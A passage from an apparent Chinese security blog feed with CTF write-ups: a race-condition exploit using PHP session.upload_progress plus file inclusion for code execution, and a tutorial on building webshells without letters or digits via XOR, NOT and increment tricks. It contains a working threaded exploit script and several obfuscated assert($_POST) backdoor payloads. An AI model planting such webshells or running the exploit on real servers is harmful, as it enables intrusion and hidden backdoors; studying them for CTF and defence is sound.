class="line"></span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;CTFShow-1024杯-Web-Writeups&quot;&gt;CTFShow 1024杯 Web Writeups&lt;/h1&gt;
&lt;h2 id=&quot;签到&quot;&gt;签到&lt;/h2&gt;
&lt;p&gt;一开始以为是无参数RCE，后来又Fuzz了PHP所有内置函数，趴着睡觉的时候突然灵光一现，刚刚好像
      
    
    </summary>
    
    
      <category term="CTF" scheme="http://ca0y1h.top/categories/CTF/"/>
    
    
      <category term="CTF" scheme="http://ca0y1h.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>session.upload_progress+LFI实现RCE</title>
    <link href="http://ca0y1h.top/Web_security/php_related/13.session.upload_progress+LFI%E5%AE%9E%E7%8E%B0RCE/"/>
    <id>http://ca0y1h.top/Web_security/php_related/13.session.upload_progress+LFI%E5%AE%9E%E7%8E%B0RCE/</id>
    <published>2020-10-19T02:34:25.000Z</published>
    <updated>2020-10-19T02:35:44.550Z</updated>
    
    <content type="html"><![CDATA[<h1 id="PHP-session-upload-process-LFI实现RCE">PHP session.upload_process + LFI实现RCE</h1><blockquote><p>参考文章：</p><p><a href="https://tgaout.github.io/2019/05/29/%E5%88%A9%E7%94%A8session-upload-progress%E8%BF%9B%E8%A1%8C%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B8%97%E9%80%8F/">https://tgaout.github.io/2019/05/29/利用session-upload-progress进行文件包含和反序列化渗透/</a></p></blockquote><p>这篇文章主要记录参考文章的复现环节，知识点部分简单介绍。</p><h2 id="0x01-PHP关于upload-process配置介绍">0x01 PHP关于upload_process配置介绍</h2><p>本文提到的PHP配置中关于session.upload_process主要是下面四个：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">session.upload_progress.enabled &#x3D; on</span><br><span class="line">session.upload_progress.cleanup &#x3D; on</span><br><span class="line">session.upload_progress.prefix &#x3D; &quot;upload_progress_&quot;</span><br><span class="line">session.upload_progress.name &#x3D; &quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span><br></pre></td></tr></table></figure><ul><li><p><code>enabled=on</code>表示当浏览器向服务器上传文件的时候，PHP会把本次文件上传的详细信息存储在session中；</p></li><li><p><code>cleanup=on</code>表示上传结束后，PHP会立即清空对应的session文件中的内容；</p></li><li><p>关于<code>prefix</code>和<code>name</code>两个选项，PHP文档中有详细说明：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201018095115.png" alt=""></p></li></ul><h2 id="0x02-upload-progress-文件包含实现RCE">0x02 upload_progress + 文件包含实现RCE</h2><h3 id="示例代码">示例代码</h3><p>直接从一道CTF题目入手：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-16 21:20:43</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">define(<span class="string">&#x27;还要秀？&#x27;</span>, dirname(<span class="keyword">__FILE__</span>));</span><br><span class="line">set_include_path(还要秀？);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    $file = $_GET[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    $file = str_replace(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, $file);</span><br><span class="line">    $file = str_replace(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, $file);</span><br><span class="line">    $file = str_replace(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, $file);</span><br><span class="line">    $file = str_replace(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;???&quot;</span>, $file);</span><br><span class="line">    <span class="keyword">include</span>($file);</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ban掉了常见的文件包含伪协议，这个时候我们可以利用<code>session.upload_progress</code>将恶意代码写入session文件，从而包含session文件。</p><p>现在还存在两个问题：首先没有代码中没有<code>session_start()</code>如何创建session文件；第二个问题，由于<code>session.upload_progress.cleanup=on</code>，当文件上传结束后，session文件的内容被自动清除，如何进行RCE？</p><h3 id="session-use-strict-mode">session.use_strict_mode</h3><p>关于第一个问题，session还有一个默认配置：<code>session.use_strict_mode=0</code>，意思就是用户可以自定义Session ID。具体而言，我们在Cookie中设置<code>Cookie:PHPSESSID=ca01h</code>，PHP将会在服务器上session存储的位置创建一个文件<code>session_ca01h</code>，即使用户没有初始化Session，PHP也会自动初始化Session，并且产生一个键值，这个键值由<code>session.upload_progress.prefix</code>+<code>session.upload_progress_name</code>组成，最后被写入sess_文件中。</p><h3 id="条件竞争">条件竞争</h3><p>为了赶在session文件被清除之前进行RCE，可以通过上传一个大文件进行条件竞争。</p><h3 id="解题">解题</h3><p>本来是想直接写一个脚本Getshell的，结果一直没能调试出来，只能用burp抓包intrude了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;&quot;&quot;http://7a4916f9-18d7-4ecf-bed3-302ed44c5763.chall.ctf.show/index.php&quot;&quot;&quot;</span></span><br><span class="line">sessid = <span class="string">&quot;ca01h&quot;</span></span><br><span class="line">data = &#123;<span class="string">&quot;cmd&quot;</span>: <span class="string">&quot;system(&#x27;ls&#x27;);&quot;</span>&#125;</span><br><span class="line">proxy = &#123;<span class="string">&quot;http&quot;</span>: <span class="string">&quot;127.0.0.1:8080&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span>(<span class="params">session</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        f = io.BytesIO(<span class="string">b&#x27;a&#x27;</span> * <span class="number">1024</span>)</span><br><span class="line">        resp = session.post(url=url, data=&#123;<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span>: <span class="string">&quot;&lt;?php eval($_POST);?&gt;&quot;</span>&#125;,</span><br><span class="line">                            files=&#123;<span class="string">&quot;file&quot;</span>: (<span class="string">&quot;ca01h.txt&quot;</span>, f)&#125;, cookies=&#123;<span class="string">&quot;PHPSESSID&quot;</span>: sessid&#125;, proxies=proxy)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span>(<span class="params">session</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        resp = session.post(url=url+<span class="string">&quot;?file=/tmp/sess_&quot;</span>+sessid, data=data, proxies=proxy)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;ca01h.txt&quot;</span> <span class="keyword">in</span> resp.text:</span><br><span class="line">            print(resp.text)</span><br><span class="line">            event.clear()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">&quot;[++++++]Retry&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    event = threading.Event()</span><br><span class="line">    <span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">30</span>):</span><br><span class="line">            threading.Thread(target=write, args=(session,)).start()</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">30</span>):</span><br><span class="line">            threading.Thread(target=read, args=(session,)).start()</span><br><span class="line">    event.set()</span><br></pre></td></tr></table></figure><p>burp抓包</p><p>文件上传请求包：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201018120147.png" alt=""></p><p>执行命令请求包：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201018120341.png" alt=""></p><p>条件竞争爆破</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201018120536.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;PHP-session-upload-process-LFI实现RCE&quot;&gt;PHP session.upload_process + LFI实现RCE&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;参考文章：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://tgaout
      
    
    </summary>
    
    
      <category term="web安全" scheme="http://ca0y1h.top/categories/web%E5%AE%89%E5%85%A8/"/>
    
      <category term="基础学习" scheme="http://ca0y1h.top/categories/web%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="web安全学习" scheme="http://ca0y1h.top/tags/web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/"/>
    
      <category term="PHP" scheme="http://ca0y1h.top/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>PHP无数字字母构造webshell</title>
    <link href="http://ca0y1h.top/Web_security/php_related/8.PHP%E6%97%A0%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8D%E6%9E%84%E9%80%A0webshell/"/>
    <id>http://ca0y1h.top/Web_security/php_related/8.PHP%E6%97%A0%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8D%E6%9E%84%E9%80%A0webshell/</id>
    <published>2020-10-19T02:30:23.000Z</published>
    <updated>2020-10-23T14:38:19.994Z</updated>
    
    <content type="html"><![CDATA[<h1 id="PHP无数字字母构造webshell">PHP无数字字母构造webshell</h1><h2 id="0x01-从一道题目出发">0x01 从一道题目出发</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &#39;flag.php&#39;;</span><br><span class="line">if(isset($_GET[&#39;code&#39;]))&#123;</span><br><span class="line">    $code &#x3D; $_GET[&#39;code&#39;];</span><br><span class="line">    if(strlen($code)&gt;40)&#123;</span><br><span class="line">        die(&quot;Long.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(preg_match(&quot;&#x2F;[A-Za-z0-9]+&#x2F;&quot;,$code))&#123;</span><br><span class="line">        die(&quot;NO.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    @eval($code);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;$hint &#x3D;  &quot;php function getFlag() to get flag&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>分析代码可知</p><ul><li>只要执行getFlag()函数应该就可以得到flag了</li><li>但对code的长度限制&lt;40，并且code不能有数字和大小写字母</li></ul><h2 id="0x02-前置知识">0x02 前置知识</h2><h3 id="异或运算">异或运算</h3><p>在PHP中，两个变量进行异或时，先会将字符串转换成ASCII值，再将ASCII值转换成二进制再进行异或，异或完，又将结果从二进制转换成了ASCII值，再将ASCII值转换成字符串。</p><p>举个例子：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">A的ASCII值是65，对应的二进制值是01000001</span><br><span class="line">&#96;?的ASCII值是63，对应的二进制值是00111111</span><br></pre></td></tr></table></figure><p>异或的二进制的值是<code>01111110</code>，对应的ASCII值是126，对应的字符串的值就是<code>~</code>了。</p><p>再结合PHP弱类型的特点，可以将整型转换成字符串型，将布尔型当作整型，或者将字符串当作函数来处理，下面我们来看一段代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    function B()&#123;</span><br><span class="line">        echo &quot;Hello Angel_Kitty&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    $_++;</span><br><span class="line">    $__&#x3D; &quot;?&quot; ^ &quot;&#125;&quot;;</span><br><span class="line">    $__();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>第5行代码对变量名为<code>_</code>的变量进行自增操作，在PHP中未定义的变量默认值为null（nullfalse0），我们可以在不使用任何数字的情况下,通过对未定义变量的自增操作来得到一个数字。</p><p>第6行代码对字符<code>?</code>和<code>&#125;</code>进行异或操作，得到字符<code>B</code>赋值给变量名为<code>__</code>的变量。</p><p>第7行代码可以看作是执行<code>B()</code>，表示调用函数B,所以执行结果为<code>Hello Angel_Kitty</code>。</p><p>再看一个非数字字母的PHP后门：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; demo1.php</span><br><span class="line">&lt;?php</span><br><span class="line">    @$_++; &#x2F;&#x2F; $_ &#x3D; 1</span><br><span class="line">    $__&#x3D;(&quot;#&quot;^&quot;|&quot;); &#x2F;&#x2F; $__ &#x3D; _</span><br><span class="line">    $__.&#x3D;(&quot;.&quot;^&quot;~&quot;); &#x2F;&#x2F; _P</span><br><span class="line">    $__.&#x3D;(&quot;&#x2F;&quot;^&quot;&#96;&quot;); &#x2F;&#x2F; _PO</span><br><span class="line">    $__.&#x3D;(&quot;|&quot;^&quot;&#x2F;&quot;); &#x2F;&#x2F; _POS</span><br><span class="line">    $__.&#x3D;(&quot;&#123;&quot;^&quot;&#x2F;&quot;); &#x2F;&#x2F; _POST </span><br><span class="line">    $&#123;$__&#125;[!$_]($&#123;$__&#125;[$_]); &#x2F;&#x2F; $_POST[0]($_POST[1]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200510130021.png" alt=""></p><p><code>_POST</code>的拼接可以将上面的代码合并为一行，代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$__&#x3D;(&quot;#&quot;^&quot;|&quot;).(&quot;.&quot;^&quot;~&quot;).(&quot;&#x2F;&quot;^&quot;&#96;&quot;).(&quot;|&quot;^&quot;&#x2F;&quot;).(&quot;&#123;&quot;^&quot;&#x2F;&quot;);</span><br></pre></td></tr></table></figure><p>还可以用更短的字符：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;&#96;&#123;&#123;&#123;&quot;^&quot;?&lt;&gt;&#x2F;&quot; &#x2F;&#x2F;_GET</span><br><span class="line">&quot;#.&#x2F;|&#123;&quot;^&quot;|~&#96;&#x2F;&#x2F;&quot; &#x2F;&#x2F;_POST</span><br></pre></td></tr></table></figure><h3 id="取反运算">取反运算</h3><p>来看一个汉字&quot;和&quot;</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; print(&quot;和&quot;.encode(&#39;utf8&#39;))</span><br><span class="line">b&#39;\xe5\x92\x8c&#39;</span><br><span class="line">&gt;&gt;&gt; print(&quot;和&quot;.encode(&#39;utf8&#39;)[2])</span><br><span class="line">140</span><br><span class="line">&gt;&gt;&gt; print(~&quot;和&quot;.encode(&#39;utf8&#39;)[2])</span><br><span class="line">-141</span><br></pre></td></tr></table></figure><p><code>和</code>的第三个字节的值为140[0x8c]，取反的值为-141。<br>负数用十六进制表示，通常用的是补码的方式表示。负数的补码是它本身的值每位求反,最后再加一。141的16进制为<code>0xff73</code>，php中<code>chr(0xff73)</code>==115，115就是s的ASCII值。<br>因此</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$_&#x3D;&quot;和&quot;;</span><br><span class="line">print(~($_&#123;2&#125;));</span><br><span class="line">print(~&quot;\x8c&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>两个写法性质一样，结果会输出：<code>ss</code></p><p>脚本生成payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; def get(shell):</span><br><span class="line">...     hexbit&#x3D;&#39;&#39;.join(map(lambda x: hex(~(-(256-ord(x)))),shell))</span><br><span class="line">...     print(hexbit)</span><br><span class="line">...</span><br><span class="line">&gt;&gt;&gt; get(&#39;phpinfo&#39;)</span><br><span class="line">0x8f0x970x8f0x960x910x990x90</span><br></pre></td></tr></table></figure><h3 id="不用数字构造数字">不用数字构造数字</h3><p>主要思想就是，利用了PHP弱类型特性，true的值为1。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$_&#x3D;(&#39;&gt;&#39;&gt;&#39;&lt;&#39;)+(&#39;&gt;&#39;&gt;&#39;&lt;&#39;)</span><br><span class="line">print($_) &#x2F;&#x2F; 1</span><br><span class="line">print($_&#x2F;$_) &#x2F;&#x2F; 2</span><br></pre></td></tr></table></figure><blockquote><p>字符<code>&gt;</code>的ascii值大于<code>&lt;</code>ascii的值</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$_++;</span><br><span class="line">print($_); &#x2F;&#x2F; 1</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><blockquote><p>php中未定义的变量默认值为null，nullfalse0</p></blockquote><h2 id="0x03-无数字字母构造webshell">0x03 无数字字母构造webshell</h2><p>代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; demo2.php</span><br><span class="line">&lt;?php</span><br><span class="line">if(!preg_match(&#39;&#x2F;[a-z0-9]&#x2F;is&#39;,$_GET[&#39;shell&#39;])) &#123;</span><br><span class="line">  eval($_GET[&#39;shell&#39;]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>思路</p><p>将非字母、数字的字符经过各种变换，最后能构造出a-z中任意一个字符。然后再利用PHP允许动态函数执行的特点，拼接处一个函数名，如&quot;assert&quot;，然后动态执行即可。</p><blockquote><p>使用assert的话PHP版本必须小于等于7.0</p></blockquote><h3 id="利用异或操作">利用异或操作</h3><p>不可打印字符，用url编码表示。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$_&#x3D;(&#39;%01&#39;^&#39;&#96;&#39;).(&#39;%13&#39;^&#39;&#96;&#39;).(&#39;%13&#39;^&#39;&#96;&#39;).(&#39;%05&#39;^&#39;&#96;&#39;).(&#39;%12&#39;^&#39;&#96;&#39;).(&#39;%14&#39;^&#39;&#96;&#39;); &#x2F;&#x2F; $_&#x3D;&#39;assert&#39;;</span><br><span class="line">$__&#x3D;&#39;_&#39;.(&#39;%0D&#39;^&#39;]&#39;).(&#39;%2F&#39;^&#39;&#96;&#39;).(&#39;%0E&#39;^&#39;]&#39;).(&#39;%09&#39;^&#39;]&#39;); &#x2F;&#x2F; $__&#x3D;&#39;_POST&#39;;</span><br><span class="line">$___&#x3D;$$__;</span><br><span class="line">$_($___[_]); &#x2F;&#x2F; assert($_POST[_]);</span><br></pre></td></tr></table></figure><blockquote><p>查ascii码对照表可以发现，0x01 = 1 = SOH; 0x13 = 19 = DC3; 0x05 = 5 = ENQ等等</p></blockquote><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200510200554.png" alt="img"></p><p>如果要直接使用的话，必须对这些不可打印的特殊字符url编码，实际上木马应该是下面这个样子：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$_&#x3D;(urldecode(&#39;%01&#39;)^&#39;&#96;&#39;).(urldecode(&#39;%13&#39;)^&#39;&#96;&#39;).(urldecode(&#39;%13&#39;)^&#39;&#96;&#39;).(urldecode(&#39;%05&#39;)^&#39;&#96;&#39;).(urldecode(&#39;%12&#39;)^&#39;&#96;&#39;).(urldecode(&#39;%14&#39;)^&#39;&#96;&#39;);</span><br><span class="line">$__&#x3D;&#39;_&#39;.(urldecode(&#39;%0D&#39;)^&#39;]&#39;).(urldecode(&#39;%2F&#39;)^&#39;&#96;&#39;).(urldecode(&#39;%0E&#39;)^&#39;]&#39;).(urldecode(&#39;%09&#39;)^&#39;]&#39;);</span><br><span class="line">$___&#x3D;$$__;</span><br><span class="line">$_($___[_]);&#x2F;&#x2F; assert($_POST[_]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200510200142.png" alt="img"></p><h3 id="利用取反操作">利用取反操作</h3><p>利用的是UTF-8编码的某个汉字，将其中的某个字符取出来，取反为字母。一个汉字的utf8是三个字节，{2}表示第3个字节。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(&quot;Content-Type:text&#x2F;html;charset&#x3D;utf-8&quot;);</span><br><span class="line">$__&#x3D;(&#39;&gt;&#39;&gt;&#39;&lt;&#39;)+(&#39;&gt;&#39;&gt;&#39;&lt;&#39;);&#x2F;&#x2F;$__&#x3D;2</span><br><span class="line">$_&#x3D;$__&#x2F;$__;&#x2F;&#x2F;$_&#x3D;1</span><br><span class="line">$___&#x3D;&quot;瞰&quot;;</span><br><span class="line">$____&#x3D;&quot;和&quot;;</span><br><span class="line">print(~($___&#123;$_&#125;)); &#x2F;&#x2F; a</span><br><span class="line">print(~($____&#123;$__&#125;)); &#x2F;&#x2F; s</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$__&#x3D;(&#39;&gt;&#39;&gt;&#39;&lt;&#39;)+(&#39;&gt;&#39;&gt;&#39;&lt;&#39;);&#x2F;&#x2F;$__2</span><br><span class="line">$_&#x3D;$__&#x2F;$__;&#x2F;&#x2F;$_1</span><br><span class="line"></span><br><span class="line">$____&#x3D;&#39;&#39;;</span><br><span class="line">$___&#x3D;&quot;瞰&quot;;$____.&#x3D;~($___&#123;$_&#125;);$___&#x3D;&quot;和&quot;;$____.&#x3D;~($___&#123;$__&#125;);$___&#x3D;&quot;和&quot;;$____.&#x3D;~($___&#123;$__&#125;);$___&#x3D;&quot;的&quot;;$____.&#x3D;~($___&#123;$_&#125;);$___&#x3D;&quot;半&quot;;$____.&#x3D;~($___&#123;$_&#125;);$___&#x3D;&quot;始&quot;;$____.&#x3D;~($___&#123;$__&#125;);&#x2F;&#x2F;$____&#x3D;assert</span><br><span class="line"></span><br><span class="line">$_____&#x3D;&#39;_&#39;;$___&#x3D;&quot;俯&quot;;$_____.&#x3D;~($___&#123;$__&#125;);$___&#x3D;&quot;瞰&quot;;$_____.&#x3D;~($___&#123;$__&#125;);$___&#x3D;&quot;次&quot;;$_____.&#x3D;~($___&#123;$_&#125;);$___&#x3D;&quot;站&quot;;$_____.&#x3D;~($___&#123;$_&#125;);&#x2F;&#x2F;$_____&#x3D;_POST</span><br><span class="line"></span><br><span class="line">$_&#x3D;$$_____;&#x2F;&#x2F;$_&#x3D;$_POST</span><br><span class="line">$____($_[$__]);&#x2F;&#x2F;assert($_POST[2])</span><br></pre></td></tr></table></figure><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200510205730.png" alt="img"></p><p>这里也有一种简短的写法<code>$&#123;~&quot;\xa0\xb8\xba\xab&quot;&#125;</code>它等于$_GET。这里相当于直接把utf8编码的某个字节提取出来统一进行取反。</p><h3 id="利用递增操作符">利用递增操作符</h3><p>我们只要能拿到一个变量，其值为a，通过自增操作即可获得a-z中所有字符。<br>数组（Array）的第一个字母就是大写A，而且第4个字母是小写a。在PHP中，如果强制连接数组和字符串的话，数组将被转换成字符串，其值为Array。再取这个字符串的第一个字母，就可以获得’A’。</p><blockquote><p>因为PHP函数是大小写不敏感的，最终执行的是ASSERT($POST[])，无需获取小写a。</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$_&#x3D;[];</span><br><span class="line">$_&#x3D;@&quot;$_&quot;; &#x2F;&#x2F; $_&#x3D;&#39;Array&#39;;</span><br><span class="line">$_&#x3D;$_[&#39;!&#39;&#x3D;&#x3D;&#39;@&#39;]; &#x2F;&#x2F; $_&#x3D;$_[0];</span><br><span class="line">$___&#x3D;$_; 